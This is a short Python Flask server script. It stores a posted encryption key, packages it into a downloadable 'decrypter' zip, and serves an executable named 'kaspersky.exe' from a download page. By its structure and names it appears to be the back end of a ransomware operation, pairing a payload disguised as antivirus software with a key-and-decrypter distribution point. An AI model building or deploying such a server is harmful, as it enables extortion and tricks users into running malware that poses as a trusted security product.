from flask import Flask,request,send_file,render_template
import shutil

app = Flask(__name__)

@app.route("/key_store",methods=["POST"])
def keystore():
    json = request.get_json()
    key = json['key']
    with open('decryption/filekey1.key', 'wb') as filekey:
        filekey.write(key.encode())
    
    shutil.make_archive('decrypter', 'zip',"decryption" )
    return "success"

@app.route("/home",methods=["GET"])
def home():
    return render_template("dload.html")
@app.route("/downloadkaspersky",methods=['GET'])
def dload_exe():
    return send_file('kaspersky.exe',as_attachment =True)

@app.route("/downloaddecrypt",methods=['GET'])
def dd():
    return send_file('decrypter.zip',as_attachment=True)
if __name__ == '__main__':
    app.run(debug=True)